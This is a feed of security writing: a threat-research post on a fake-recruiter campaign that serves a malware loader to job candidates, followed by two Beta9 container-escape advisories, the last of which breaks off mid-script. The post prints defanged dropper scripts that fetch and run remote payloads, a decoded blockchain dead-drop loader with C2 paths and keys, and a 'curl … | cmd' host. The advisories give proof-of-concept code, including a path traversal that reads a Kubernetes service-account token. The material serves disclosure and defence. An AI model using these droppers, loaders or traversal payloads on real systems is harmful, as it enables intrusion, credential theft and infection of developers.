item.title: Contagious Interview - One Interview Away From Infection
item.description: JFrog Security Research traced a fake interview operation run by the fictitious company AccuraSoftHire: a careers site, job ads on real boards, ID-verified LinkedIn recruiters, a poisoned take-home assignment and a 'camera driver' serving a malware loader to job candidates.
item.content:encoded:
Exposing a new threat actor using the same attack vector that infected Binance.
On 3 November 2026 Binance [published](https://www.binance.com/en/blog/community/3229153443759566763) its account of what has been reported as the largest theft in the history of cryptocurrency. What makes the attack so interesting, beyond the more than $6 billion in stolen assets, is that, according to Binance, a key step was a fake job interview. In September a software engineer was approached on a job platform by a "project director" at a company that did not exist. There were two interviews, one of them a live video call with "HR". In the second, the engineer was asked to download the coding assignment from a code repository onto his work computer. On 29 October, according to Binance, about $6.34 billion in cryptocurrency left its hot wallets. Binance says the FBI has attributed the attack to North Korea.
![](/img/RealTimePostImage/post/accurasofthire-fake-interview/thumbnail.png)
That three-step lure, a recruiter, an interview, an assignment to download, is the vector. All of these aren't new. Security companies have described it since 2023, and a joint advisory in September counted at least thirty thousand infected machines. This post focuses on the machinery behind it: the company, the accounts, the packages and the servers that have to exist for the assignment to do its work. We started with one bad npm package and followed it to the operation that made it: a careers site, job ads on Indeed and Glassdoor, recruiters with identity-verified LinkedIn profiles and a GitHub profile, a take-home test that loads the package, and a "camera driver" the company's own web server hands to candidates.
This is the story of how the trail ran, what a decoy company is made of, and what a developer can do about it. We will not go deep into the loader itself; it has been taken apart in our earlier posts. The point here is the vector: how a stranger gets a developer to run their code, on their own machine, as a normal step of applying for a job.
## **It started with a hijacked package**
In June 2026 [JFrog described](https://research.jfrog.com/post/hijacked-npm-vscode-tasks-blockchain/) two small npm packages of one developer whose new versions had been poisoned through the developer's own GitHub account. The poisoned versions added a hidden VS Code task that ran when the folder was opened, and the "font" file the task ran was JavaScript. That loader read its server address from a public blockchain transaction, a dead drop, and fetched the rest from there.
The same loader turned up somewhere else. Over the summer a farm of throwaway npm accounts had been publishing look-alikes of popular Tailwind CSS plugins: forms, animations, scrollbar helpers, line-clamp, typography. Each was a copy of the real plugin with the loader appended. The packages lived for hours or days before npm removed them. Then a new one appeared under a new name and a new account.
There were a lot of packages and no people. The accounts had disposable email addresses and nothing else. So we went looking for the same names on GitHub, hoping to understand more about the campaign and the operator.
## **One email address**
One of the packages, `scrollbar-hide-plugin`, was registered by author `sun117` with the address `handy.apple117@gmail.com`. The package even contained label `A10-npm-handy`, giving additional evidence linking the package to this email. The same address signs the commits of a GitHub account called `oleksandr3201`, created on 19 June 2026, whose profile reads "Oleksandr Hryniuk, Project Manager @ AccuraSoftHire", with the company's website, a company email address and a location in Kyiv. Six days after the account was created, a job-scraping dataset recorded its first AccuraSoftHire job ad.
The npm side survives on a registry mirror, with the publisher's name and address in the package record:
```json "time": { "1.0.0": "2026-08-01T08:26:31.583Z", "1.0.1": "2026-08-02T14:53:33.851Z" }, "_npmUser": { "name": "sun117", "email": "handy.apple117@gmail.com" }, "maintainers": [ { "name": "sun117", "email": "handy.apple117@gmail.com" } ] ```
The GitHub side is one `.patch` suffix away:
``` From: oleksandr3201 <handy.apple117@gmail.com> Date: Fri, 30 Oct 2026 02:14:50 -0700 Subject: [PATCH] Update Readme.md ```
That is the whole hinge: one Gmail address shared between an npm account that publishes the loader and a GitHub account that recruits for a company. Everything after it was checking whether the company was real.
## **The company**
Domain accurasofthire\[.\]com was registered at Hostinger on 17 April 2026\. It serves a careers portal built in React, and it has everything a candidate would look for: an About page with a founding story and a mission, a leadership page with four photographed executives, six client testimonials, a partner portal, a contact form and a job board.
![](/img/RealTimePostImage/post/accurasofthire-fake-interview/the-company.png)
The job board lists twelve remote roles, from a senior MERN engineer to crypto content writers, each with a hiring status that moves**,** which makes the hiring process look active**.**. The roles sit behind a sign-in, and the careers page says why: once signed in "you will see the full description and can apply with identity and video verification steps".
![](/img/RealTimePostImage/post/accurasofthire-fake-interview/open-roles.png)
The ads were real ads on real boards. A job-scraping dataset recorded the first, a senior MERN developer, on 25 June 2026; by August it was on jobbers.io at 60 dollars an hour and, per search snippets, on Indeed, Glassdoor and SimplyHired. The company's LinkedIn page ("IT Services and IT Consulting", Tonopah, Arizona, 93 followers, "2–10 employees") had posted the same ad a week before we looked, with an application link on a third-party recruiting platform, and a new one the morning we did.
Application requires detailed personal details: a legal full name, phone, city, time zone, work authorization,a cover letter and a recorded "verification video", all of it landing in an admin area that lists each candidate with a checkbox labelled "Driver setup".
The company asks the candidate to prove who they are. One thing that might look suspicious is that the location of the company depends on the page: Tonopah, Arizona on LinkedIn, Oregon on its recruiter's hiring banner, Georgia in its staff's job histories and Kyiv in their profile locations
## **The recruiters**
On LinkedIn the company has a page, a logo, a one-line pitch about "reliable talent acquisition", and a staff of four employees. A recruitment manager posts the job in developer groups, where it does what job posts do: people reply that they are available, and she tells each of them to connect first, so the rest happens in private messages. A project manager and a chief operating officer complete the team. All three have the small grey shield next to their names that LinkedIn shows when a verification partner has checked a member’s government ID.
![](/img/RealTimePostImage/post/accurasofthire-fake-interview/verified-linkedin.png)
The shield is the part that stops a careful candidate from looking further, so it is worth saying what it means. A government ID bearing that name was checked by LinkedIn's verification partner. It does not confirm the job title, and it says nothing about the company. And the three profiles share a shape that no real staff page has. All of them joined LinkedIn in 2026, in consecutive months, starting in the month the company's domain was registered, and each was verified within weeks of joining. Their degrees and work histories begin just before the company does; the chief operating officer's job at it begins before the domain existed. The site's own leadership page lists two more executives whom we could not find on LinkedIn.
![](/img/RealTimePostImage/post/accurasofthire-fake-interview/gh.png)
The evidence that ties the personas to the packages runs through the project manager. His GitHub account, oleksandr3201, was created on 19 June 2026, the month its LinkedIn profile was. It carries the same headshot, the company email and, in GitHub's own social-accounts field, a link to the LinkedIn profile, so the two personas are tied by the account itself. It sat empty for four months while the job ads ran, then was dressed in two days at the end of October: a profile README written like a LinkedIn summary, and a restaurant project copied from another developer's repository with every commit still theirs.
The address on that account is confirmed by GitHub and allows us to make a strong bond between the persona’s GitHub account and the npm account published malware. Its first commit was made in GitHub's own editor, which only accepts an address the account has verified, and GitHub signed it:
```json { "commit": { "author": { "name": "Oleksandr Hryniuk", "email": "handy.apple117@gmail.com", "date": "2026-10-30T06:17:11Z" }, "committer": { "name": "GitHub", "email": "noreply@github.com" }, "verification": { "verified": true, "reason": "valid", "verified_at": "2026-10-30T06:17:11Z" } } }
```
That address is the registered owner of the npm account sun117, which published one of the loader packages, the build the operator labelled "handy". The company's other GitHub account, accurasofthire. As of 4 November 2026, it is hidden on GitHub, but we could find its commits in the test tasks of candidates. Approximation by github id, showed that it was created on 4 August 2022, almost four years before the domain and the operation started.
We wound two records at GHArchive: as of 2 May 2024, names actor 110576010 with login moderndev117 making repository 794936206 public under the name moderndev117/paykickstart. Later, at 3 May 2026 push, actor 110576010 with login accurasofthire, repository 794936206 named accurasofthire/landingpage-frontend. Repository numbers are as permanent as account numbers, so we believe that the account was renamed specifically for this operation. Worth to mention that the original account name follows the naming account used in this campaign: sun117, handy.apple117, codeCrafts117, Super117, lancer117.
If you were a developer checking this company, it would pass. The site works and says the right things. The ads are up on the boards you would search and on LinkedIn, posted by recruiters with verified badges and hundreds of connections. The project manager has a face, a title, a company email, a degree and a GitHub profile with a project of real commits.
The parts that due diligence checks are the parts that were built, and the checks that fail, a time zone on a commit, a COO who predates his company, a headquarters that moves from page to page, are not the ones a candidate makes.
## **The task**
The take-home itself is unremarkable, which is the point. The candidate gets a link to a repository, a React and Redux landing page with a design to match and ninety minutes to match it, and is asked to copy the repository and build on it. Eighteen candidates later published their solutions on GitHub, and every one looks like every other front-end exercise: a Dockerfile, a Create React App skeleton, a Tailwind configuration. The Tailwind configuration is where the trap is. It loads eleven plugins:
```js plugins: [ require("@tailwindcss/container-queries"), require("tailwindcss-flip"), require("tailwindcss-animate"), require('tailwind-scrollbar-hide'), require('@tailwindcss/aspect-ratio'), require('tailwindcss-opentype'), require("tw-elements/plugin.cjs"), require('tailwind-custom-forms'), require('@formkit/tailwindcss'), require("tailwindcss-radix")(), require('tailwindcss-fluid-type') ], ```
Ten of them are real Tailwind plugins. The one in the middle, `tailwind-custom-forms`, is a copy of the official forms plugin, `@tailwindcss/forms`, with the malware loader pasted onto the end of its file. That line is the only poisoned thing in the repository. Nothing about it runs at `npm install`, so there is no install script for a scanner to flag. The loader runs when Tailwind builds the CSS, and building the CSS is the first thing the task tells the candidate to do.
That one line changed four times, and the changes show how the operation is run. npm takes each look-alike down within days of a report. Each time it did, the operator edited the task's config to name a new copy of the same package, under a new name, from a new throwaway account: one in August, two more in September. The version candidates copied from GitHub at the end of September has no such line at all. As far as the public repository goes, the task was clean from then on. The poisoned one had moved, not stopped: in October a candidate received the same project as a Bitbucket link, and its config named a fourth look-alike. The packages kept coming too. On 3 November, while we were writing this, the account behind that fourth one published it again, for the third time, with four sibling packages sharing one loader file, and npm removed all five within three hours. The task does not depend on any one package. It depends on there always being one.
The first of those four packages is the one that gives the operation away, because of who published it. Start with the task. Its repository was created on 5 August 2026 with a single commit, and the commit carries its author's name and address:
``` From: Anton Goss <antongoss11995@gmail.com> Date: Wed, 5 Aug 2026 09:49:43 +0000 Subject: [PATCH] Initial commit ```
GitHub credits that commit to the company's own account, accurasofthire, which means the address was registered on it. We found no other trace of “Anton Goss.” What matters is the address, because it appears in exactly one other place. Three days before the commit, an npm account called goss1000 had published tailwind-custom-forms, the package the task's config names, and the registry recorded who did it:
```json { "_npmUser": { "name": "goss1000", "email": "antongoss11995@gmail.com" }, "0.5.2": "2026-08-02T14:58:10.938Z" }
```
The evidence indicates that the person who wrote the interview exercise had published the package it loads. The time of that publication does the rest. In the thirteen minutes around it, three other accounts from the this campaign were publishing their own look-alikes:
``` 14:53:25 evaward1 tailwindcss-anim 1.3.5 14:53:33 sun117 scrollbar-hide-plugin 1.0.1 14:58:10 goss1000 tailwind-custom-forms 0.5.2 14:59:31 georgeodom1 tailwind-anim 1.1.1, then five more by 15:06:51 ```
evaward1 is another account we tied to this campaign. sun117 is the account registered to the recruiter's address. In our assessment, the recruiter, the task author and the packages are one operation.
After we found a company, we've got additional evidence of a target of this campaign. In October 2026, a developer posted on LinkedIn that they had received a Bitbucket link to a React take-home project from AccuraSoftHire, were already suspicious, and used an AI coding assistant that flagged the malicious code.
## **The site hands out the loader itself**
We had assumed the careers site was a front: something to make the company look real while the packages did the work. Reading its JavaScript bundle changed that. The site has a second delivery path that has nothing to do with the take-home, and a third that was built and waiting.
Step two of the application is "Video verification": the candidate records a short clip in the browser. Partners get the same step under the name "Partner introduction". Its failure is scripted, and the script is short. The component reads one field of the signed-in user's profile, `driverStatus`, which the admin page shows as the "Driver setup" checkbox. While it is zero, the Start button never asks the browser for a camera. It shows "Checking for a camera…" for six seconds and then fails:
```js const Ny = "Sorry, we detected that your system does not have a compatible camera environment. Please contact the support team.", Sy = 6e3; function ky() { const { user: r } = _t(), u = Number(r?.driverStatus ?? 0) === 0, ... async function K() { // the Start button if (d.stage === "idle" && u) { o(G => ({ ...G, stage: "detecting" })); D.current = setTimeout(() => { o(G => ({ ...G, stage: "support_team" })) }, Sy); return; } if (d.stage === "idle") { // only once the server says the driver is installed try { await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }) ... stage "ready_record" } catch { stage "no_camera" } } } ```
The box then shows "Camera environment not compatible" and the constant above. The camera check does not check the camera. `getUserMedia` is only reached for a user the server has already marked as having run the "driver".
The candidate can go on without a clip. The application is then saved with the status `driver_guidance_acknowledged`, and the admin's view of it reads "No verification video on file — applicant continued with the alternate path (no camera upload)."
The fix lives on another page of the site, /vscode-setup, headed "Technical onboarding" and "Recommended VS Code configuration": "Standard settings bundle for candidates and interview workflows. Your detected environment: Windows." The page builds one command from the browser's user agent and the site's own address:
```js curl -L -o CameraDriverUpdate.msi "hxxps://accurasofthire[.]com/camera-driver/setup-win" curl -L -o CameraDriverUpdate-mac.zip "hxxps://accurasofthire[.]com/camera-driver/setup-mac" curl -L -o CameraDriverUpdate.deb "hxxps://accurasofthire[.]com/camera-driver/setup-linux" ```
with a "Copy command" button and the instruction: "Copy the line below, run it in a terminal on the machine you will use for this process, then confirm completion when you are signed in (so we can match your account to the checklist)." Below it, a button labelled "Mark workstation setup complete" writes the acknowledgement to the candidate's record, after which, the page promises, "the optional notice on Apply and Profile will not appear for you". It adds, for anyone who wonders: "we do not execute code in your browser to inspect your terminal." That is true. The code runs in the terminal. The admin's user list keeps the score in a column called "Driver setup", a checkbox per registered candidate.
![](/img/RealTimePostImage/post/accurasofthire-fake-interview/clickfix.png)
We took the three installers apart in a sandbox. They are thin droppers the only goal of which is to imitate installation of the driver and fetch a bootstrap script from the careers site and run it. The Windows one, served as `/camera-driver/bootstrap-win?flag=10`, installs Node if the machine has none (its messages call Node "the plugin"; the window title is "The plugin was installed successfully."), then:
``` set "PAYLOAD_URL=%SITE_URL%/camera-driver/payload.js" curl -s -L -o "%PAYLOAD_JS%" "%PAYLOAD_URL%" start "" /b cmd /c ""%NODE_EXE%" "%PAYLOAD_JS%" & del /f /q "%PAYLOAD_JS%"" echo [SUCCESS] Driver plugin installation completed successfully. curl -s -L "%SITE_URL%/camera-driver/ack" >nul 2>&1 start "" cmd /c del /f /q "%~f0" ```
It downloads the payload, starts it in the background, deletes it, tells the server, and deletes yourself. The macOS and Linux script is the same flow in bash, down to the `nohup` and the self-delete:
```sh SITE_URL="${ACCURASOFT_SITE:-hxxps://accurasofthire[.]com}" PAYLOAD_URL="${SITE_URL%/}/camera-driver/payload.js" ... nohup bash -c "\"$NODE_EXE\" \"$PAYLOAD_JS\"; rm -f \"$PAYLOAD_JS\"" >/dev/null 2>&1 & ... (sleep 5 && rm -f "$0") & curl -s "hxxps://accurasofthire[.]com/camera-driver/ack" >/dev/null 2>&1 ```
payload.js is 13 KB and begins:
```js global.i = 'A10-online**';const __0x04b12=77;function __0xa9e27(){return 3279;}(function(_0x05a598){var _0x05a598a=["Z2xvYmFsLnI9cmVxdWlyZTtpZih0eXBlb2YgbW9kdWxlPT09J2", ... ```
The first statement is the build marker, the string the loader sends home in a `Sec-V` header so the operator knows which build is calling. Every look-alike package in the malware family carries one; this one says "online". The rest is a base64 string array handed to `eval(atob(...))`. Decoded, it is the farm's loader:
```js const SENDER='0xa322E5f3D311D3080e6f0121063e9aDC2490Ef1a'.toLowerCase(); const INDEXER_URL='hxxps://eth[.]blockscout[.]com/api'; ... const[ip1,ip2]=decodeAddress(match.tx.to); ... await run_loader(new URL(`hxxp://${ip1}:443/0x/cls`),'q4FZkxX{!h,Sr3=@',!1); await run_loader(new URL(`hxxp://${ip1}:443/0x/ls`),'y-p_>d$0B&@^1aQk',!0) ```
It reads the newest transaction sent by one Ethereum address, unpacks two server addresses from the recipient field, fetches two stages over port 443 in plain HTTP, XOR-decodes them with those keys, runs one in the current process and the other as a detached Node process. Same sender, same paths, same keys, same Chrome user agent as the Tailwind packages.
``` 2026-10-19T10:22:59Z nonce 608 to 0x67B38e9b67B38E9b68656c6C6f6970626f742121 67.B3.8E.9B = 103.179.142.155, twice, then "helloipbot!!" ```
The careers site is not standing in front of the malware. It is one of the places the malware is served from.
The third path is quieter. A "job alerts" page on the site offers a Chrome extension, and a Windows desktop app that the page says is coming, and walks the candidate through installing the extension by hand: open chrome://extensions, turn on Developer mode, Load unpacked, pick the extensions/job-new-alerts folder, copy the extension ID, then run a setup script from the site, setup-full-windows.ps1. That script downloads a second one and runs it with the execution policy bypassed; the second registers a native messaging host named com.accurasoft.jobalerts for Chrome and Edge in the user's registry, and offers a scheduled task that polls the site every five minutes with the browser closed. The host itself is 75 lines and has one job beyond answering "ping":
``` const SETUP_CMD ="curl hxxp://accurasofthire[.]com/notification-settings-win?download=1 | cmd"; ... if (cmd === "runWinNotificationSetup") { ... await execAsync(SETUP_CMD, { ... ```
What that fetches is a nine-line batch file: make a `.nvm` folder in the user's profile, download `notification-bootstrap-win?flag=10` into it as bootstrap.cmd, start it hidden, clear the screen three times. That bootstrap is the camera one with the payload step missing: on 2 November it installed Node and then ran `node -e ""`, an empty program, and printed **"\[SUCCESS\] Notification setup completed successfully."** The path is complete and the payload slot is empty. Whether it was ever filled, or is filled only for a signed-in candidate, we could not tell.
A failing camera check fixed by a curl command is not new. Sekoia described the same lure in March 2025 under the name ClickFake Interview, with a Go backdoor behind it, and Silent Push found it a month later on the application site of a front company called BlockNovas. AccuraSoftHire's version drops the npm loader instead, dresses the command as a "recommended VS Code configuration", and leaves room in every download for the site that served it and the candidate who fetched it.
**An earlier name on the task**
The task is older than the company name on it. Every candidate copy from April and May starts from the same root commit, made on 20 April 2026, three days after the domain was registered, by a git identity called codeCrafts117 that GitHub credits to a second hidden hiring account, hiretechpartners. The project was called keepcodein then. It already had the trap in it: a look-alike of Tailwind's line-clamp plugin, published four days earlier, whose loader reads dead drops on Tron and Aptos rather than Ethereum. So the company's take-home is tied by indicator to an earlier wave, before AccuraSoftHire had a recruiter or a job ad. The root commit, read from one candidate's copy:
``` commit 5a50d985 "Page init" Author: codeCrafts117 <seo.theconnectivemediagroup@gmail.com> 2026-04-20 08:45:19 -0700 Committer: codeCrafts117 <seo.theconnectivemediagroup@gmail.com> credited by GitHub to the account: hiretechpartners ```
The earlier identity fits a pattern we kept meeting. Every hiring persona in this operation comes with an npm account on the same email address: the recruiter has sun117, the task author has goss1000, and codeCrafts117's address belongs to an npm account whose one package lived for a few minutes on 31 July before npm removed it. In our assessment, the people who recruit and the people who publish are the same people, and they do not separate the addresses.
In May the AccuraSoftHire account took the task over and edited it in its own name, adding a README and a "Why choose us" image and pinning a newer look-alike. Later it rewrote that commit to pin a newer one still, and kept the May dates. The rewrite shows that the commit's lockfile resolves a package version published 24 days after the commit claims to have been made. Backdating is a habit on both sides of this story, and lockfiles are bad at keeping secrets.
Then the April identity did something that changes what "recruiter" means here. Between 28 April and 6 May, eight to sixteen days after it wrote the task, codeCrafts117 appears as the committer on 23 rewritten commits in 23 repositories belonging to nine developers. Each rewrite keeps the owner's name and the original date and adds a hidden loader: in a config file, or as the VS Code task and fake font of the hijacked packages we started from. One developer, a job seeker, had ten repositories rewritten in four minutes, with the push scripts of a known commit-tampering tool listed in .gitignore. These commits were made with the owners' own push access. One of them, with the owner's name and address removed:
``` commit e5f6573f "Add comprehensive project README …" files: .gitignore, README.md, postcss.config.mjs Author: <the repository's owner> 2026-03-19 22:28:37 (kept) Committer: codeCrafts117 <the owner's own address> 2026-04-28 11:06:58 -0700 ```
The committer name is the hiring persona's; the committer address is the owner's own. This suggests that a token, or a session on each developer's machine, was in the operator's hands.
## **Where this sits**
This playbook has been out in the open for years. First documented by Unit 42 as "Contagious Interview," it has since been tracked by dozens of security vendors and international agencies. A recent multinational advisory finally revealed the massive scale of the operation: tens of thousands of infected devices globally and thousands of drained crypto wallets in less than a year. Behind the scenes, the attackers run an industrial-scale operation, spinning up fake front companies like the one, described by our pos, to seed hundreds of poisoned code repositories across the web.
IoC, such as markers “`A10-npm-handy`” in the code, network paths /0x/cls in the payload and a failing camera check method are the similar to the campaigns attributed to the North Korean hackers this year: PolinRider and ClickFake
## **For developers**
* A legitimate interview rarely need you to install a driver, and we know of no employer that needs a "recommended VS Code configuration" delivered as a curl command. Treat a camera check that fails and hands you a command as a likely attack, whatever the site looks like. * Open unknown projects in VS Code's restricted mode, and read `.vscode/tasks.json` before you trust the folder. * Treat a take-home as untrusted code from a stranger. Run it in a throwaway virtual machine or container with no tokens, SSH keys, wallet files or browser profiles on it. * Compare dates. A lockfile that resolves a version published after the commit that added it has likely been rewritten. * A checkable company is not a safe one. The site, the ads, the team page, the GitHub activity and the recruiter's profile are the cheapest parts to build, and they are built first. A LinkedIn verification badge is an ID check,, not a company. Check what cannot be built cheaply: a person you know who has been paid by them, a registration somewhere a company has to register, a recruiter whose history predates the job ad.
## **Summary**
According to Binance, the intrusion involved a recruiter on a job platform, two interviews, and a coding assignment downloaded from a repository. We have found no link between AccuraSoftHire and that intrusion. That is the whole vector, and this post has tried to show what it looks like from the inside, in one operation that runs it. AccuraSoftHire is a company built over a few months: a careers site with an About page, a leadership team and twelve roles in various states of being filled; job ads on Indeed and Glassdoor; three LinkedIn recruiters with government-ID verification badges, and a project manager whose GitHub account is registered to the same address as one of the package publishers. Behind it, one take-home that loads one look-alike package, re-pointed every time npm removes one, and a "camera driver" that the company's own web server hands to candidates and that carries the same loader. In our assessment, there is no ambiguity about what the company is for. A company that serves malware from its own careers site is not a company with a security problem.
Over the course of this research we met a few other operations using the same techniques with tricks of their own: a poisoned lockfile instead of a poisoned plugin, exchange-branded "trading bots" that install everything the moment the folder is opened in VS Code. They share the idea with AccuraSoftHire and none of its indicators.
The operators do not need an exploit. They need a developer to do what a job application asks, on the machine they work on. Who is behind any given instance is a question for the vendors and the FBI; what this record shows is that the lure is the same wherever it turns up, that more than one crew runs it, and that the cover is built to pass exactly one check, a job seeker's, and is careless about every other.
**Indicators**
The full list is in the case record. The names a reader is most likely to meet:
* **Domains:** accurasofthire\[.\]com (careers site and loader server) * **GitHub:** accurasofthire and hiretechpartners (hidden hiring accounts), oleksandr3201 (recruiter persona) * **LinkedIn:** the company page AccuraSoftHire; three recruiter persona profiles, including in/oleksandr-hryniuk-230b93415 (linked from the GitHub account); the ad's application link on app.testedrecruits.com (a third-party recruiting platform, not an indicator in itself). item.title: Beta9 is vulnerable to a Build Worker Sandbox Escape via Chroot-only Buildah Isolation
item.description: CVE-2026-120306, CRITICAL, Beta9 is vulnerable to a Build Worker Sandbox Escape via Chroot-only Buildah Isolation
item.content:encoded:
## Summary Beta9 is vulnerable to a Build Worker Sandbox Escape via Chroot-only Buildah Isolation ## Component Beta9 worker (github.com/beam-cloud/beta9) ## Affected versions worker < 0.1.756 ## Description Beta9 turns each shell command in a tenant image definition into a Dockerfile RUN line and executes it with Buildah on a build worker. The worker image sets `BUILDAH_ISOLATION=chroot`, and no `buildah` invocation passes `--isolation`, so the step only changes its filesystem root. It keeps the worker pod's PID, network, IPC, and user namespaces, runs as uid 0, and holds `CAP_DAC_OVERRIDE`. Pid 1 in that procfs is the worker entrypoint, so `/proc/1/root` is the worker container's filesystem and is writable. That filesystem holds `runc`, `buildah`, and `runsc`, the binaries the worker uses to start tenant containers, the worker's Kubernetes service account token, and the host directories mounted into the pod. Worker pods are privileged. Clip v2 layered builds are the default, so a tenant with a workspace token reaches this by submitting one image build. A read-only probe confirmed the shared namespaces, `CAP_DAC_OVERRIDE`, and that the worker `runc` binary is visible at `/proc/1/root`. Worker 0.1.756 runs Buildah RUN steps, including the WORKDIR mkdir, under OCI isolation with private PID, IPC, and network namespaces. Tenant build arguments are passed into the build container rather than into the Buildah process environment. ## PoC
**Step 1 - Install the client and select the deployment**
Any workspace token is enough. No pool selector, custom base image, or Docker option is required. ``` pip install beta9 beta9 configure ```
**Step 2 - Save the read-only probe**
The probe reports uid, namespace identity, the effective capability mask, and whether the worker's `runc` binary and service-account token path are visible through `/proc/1/root`. It does not write, delete, or print secret material. The nonce on the RUN line keeps the build off the image cache. ``` #!/usr/bin/env python3 import base64 import re import sys import uuid from beta9.abstractions.image import Image from beta9.clients.image import BuildImageRequest MARK = "B9PROBE" PROBE = r""" set -u M=B9PROBE R=/proc/1/root echo "$M uid=$(id -u) pid=$$" echo "$M caps_self=$(awk '/^CapEff/{print $2}' /proc/self/status)" echo "$M pidns_self=$(readlink /proc/self/ns/pid)" echo "$M userns_self=$(readlink /proc/self/ns/user)" echo "$M netns_self=$(readlink /proc/self/ns/net)" echo "$M visible_pids=$(ls /proc | grep -c '^[0-9][0-9]*$')" echo "$M init_cmd=$(tr '\0' ' ' < /proc/1/cmdline | tr -s ' ' '_')" echo "$M caps_init=$(awk '/^CapEff/{print $2}' /proc/1/status)" echo "$M pidns_init=$(readlink /proc/1/ns/pid)" echo "$M userns_init=$(readlink /proc/1/ns/user)" if [ -e "$R/usr/local/sbin/runc" ]; then echo "$M worker_runc=present" else echo "$M worker_runc=absent" fi if [ -r "$R/var/run/secrets/kubernetes.io/serviceaccount/token" ]; then echo "$M sa_token=readable" else echo "$M sa_token=unreachable" fi if [ -d "$R/images" ]; then echo "$M images_mount=present" else echo "$M images_mount=absent" fi exit 0 """ def probe_command() -> str: blob = base64.b64encode(PROBE.encode()).decode() return f"echo {blob} | base64 -d | sh # {uuid.uuid4().hex}" def run_build(command: str): log = [] for resp in Image(python_version="python3", commands=[command]).stub.build_image( BuildImageRequest( python_version="python3", commands=[command], ignore_python=True, ) ): if resp.msg: sys.stdout.write(resp.msg) sys.stdout.flush() log.extend(line for line in resp.msg.splitlines() if MARK in line) if resp.done: break return log def parse(log): facts = {} for line in log: tail = line.split(MARK, 1)[1] for key, value in re.findall(r"(\w+)=(\S+)", tail): facts[key] = value return facts def has_dac_override(cap_hex: str) -> bool: try: return bool(int(cap_hex, 16) & 0x2) except ValueError: return False def main() -> int: facts = parse(run_build(probe_command())) if not facts: print("\nINCONCLUSIVE: the build log carried no probe output") return 2 print("\nProbe results") for key in sorted(facts): print(f" {key} = {facts[key]}") neighbour = facts.get("worker_runc") == "present" or "worker" in facts.get("init_cmd", "") dac_override = has_dac_override(facts.get("caps_self", "0")) print() if neighbour and dac_override: print( f"VULNERABLE: the build step ran as uid {facts.get('uid')} as pid " f"{facts.get('pid')} inside the worker's own PID and user namespaces, " f"resolved the worker container's filesystem at /proc/1/root, and holds " f"CAP_DAC_OVERRIDE, which bypasses permission checks on that filesystem" ) return 1 print("NOT VULNERABLE: the build step saw only its own container") return 0 if __name__ == "__main__": raise SystemExit(main()) ```
**Step 3 - Run the probe**
``` python3 poc_beta9_build_isolation.py ```
Expected output on a worker before 0.1.756: ``` VULNERABLE: the build step ran as uid 0 as pid inside the worker's own PID and user namespaces, resolved the worker container's filesystem at /proc/1/root, and holds CAP_DAC_OVERRIDE, which bypasses permission checks on that filesystem ```
The lines above that verdict include `worker_runc = present`, a `caps_self` mask with the `CAP_DAC_OVERRIDE` bit set, an `init_cmd` naming the worker entrypoint, and a `visible_pids` count covering the worker pod. On worker 0.1.756 or later the same build prints `NOT VULNERABLE: the build step saw only its own container`. ## Vulnerability Mitigations Upgrade the Beta9 worker to 0.1.756 or later. That release drops chroot isolation. Buildah RUN steps use OCI isolation with private PID, IPC, and network namespaces, and tenant build arguments are applied inside the build container. The change is https://github.com/beam-cloud/beta9/pull/1897, commit a28bf12cf0007c792a25d8ed282b4e8bf6f30393, released as worker 0.1.756 on 2026-09-15. Gateway 0.1.776 is the gateway tag cut from the same commit. The isolation change is in the worker image. ## References https://www.cve.org/CVERecord?id=CVE-2026-120306 https://github.com/beam-cloud/beta9/pull/1897 https://github.com/beam-cloud/beta9/commit/a28bf12cf0007c792a25d8ed282b4e8bf6f30393 https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756 https://github.com/beam-cloud/beta9

item.title: Beta9 is vulnerable to a Container Escape via Unvalidated Sandbox File Paths
item.description: CVE-2026-120307, CRITICAL, Beta9 is vulnerable to a Container Escape via Unvalidated Sandbox File Paths
item.content:encoded:
## Summary Beta9 is vulnerable to a Container Escape via Unvalidated Sandbox File Paths ## Component Beta9 worker (github.com/beam-cloud/beta9) ## Affected versions worker < 0.1.756 ## Description The Beta9 worker serves the sandbox file API from outside the container. `getHostPathFromContainerPath` in `pkg/worker/container_server.go` turns the tenant's path into a worker path. If the unresolved path starts with a mount destination, including the default upload mount at `/tmp/.beta9`, the remainder is joined onto that mount's source with `filepath.Join`, which cleans parent-directory segments after the prefix check. A long enough run of those segments names any absolute path on the worker. A path that matches no mount is joined onto the container root and opened in the worker's filesystem, so an absolute symbolic link such as `/var/run` pointing at `/run` is followed against the worker root. Upload, download, stat, list, find-in-files, replace-in-files, and delete-file all call this helper. A tenant with a workspace token and one running sandbox can read, write, list, and delete files on the hosting worker as root, including files of other tenants on that machine. A read-only proof downloaded the worker pod's Kubernetes service account token through the file API for a path that did not exist inside the sandbox. In the shipped remote-node manifests that service account is bound to cluster-admin. Worker 0.1.756 opens these paths with `os.OpenRoot`, so parent-directory and symlink lookups stay inside the container root or the mount source. File operations refuse read-only mounts and do not write through a symlink swapped in after path resolution. ## PoC
**Step 1 - Install the client**
A workspace token and one sandbox are the credentials a tenant already uses. The proof reads one path two ways and prints decoded token claims. It does not print the token, and it writes nothing. ``` pip install beta9 ```
**Step 2 - Save the comparison script**
``` #!/usr/bin/env python3 import argparse import base64 import json from beta9.abstractions.base import set_channel from beta9.channel import Channel from beta9.clients.gateway import GatewayServiceStub, ListContainersRequest from beta9.clients.pod import PodSandboxDownloadFileRequest, PodServiceStub TOKEN_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/token" TRAVERSAL = "/" + "../" * 16 + TOKEN_PATH.lstrip("/") def jwt_claims(token: str) -> dict: try: payload = token.split(".")[1] payload += "=" * (-len(payload) % 4) data = json.loads(base64.urlsafe_b64decode(payload)) except (IndexError, ValueError): return {"note": "not a decodable JWT", "length": len(token)} k8s = data.get("kubernetes.io", {}) return { "sub": data.get("sub"), "namespace": k8s.get("namespace"), "pod": k8s.get("pod", {}).get("name"), } def main() -> int: ap = argparse.ArgumentParser() ap.add_argument("--gateway", required=True, help="gateway address, host:port") ap.add_argument("--token", required=True, help="beta9 workspace token") ap.add_argument("--container-id", help="reuse this running sandbox") ap.add_argument("--keep-container", action="store_true") args = ap.parse_args() channel = Channel(args.gateway, args.token) set_channel(channel) pod = PodServiceStub(channel) from beta9 import Sandbox container_id = args.container_id if not container_id: gw = GatewayServiceStub(channel) running = [ c for c in gw.list_containers(ListContainersRequest()).containers if c.status.upper() == "RUNNING" and c.container_id.startswith("sandbox-") ] if running: container_id = running[0].container_id print(f"[*] reusing running sandbox: {container_id}") created = False if container_id: instance = Sandbox().connect(container_id) else: print("[*] creating a minimal 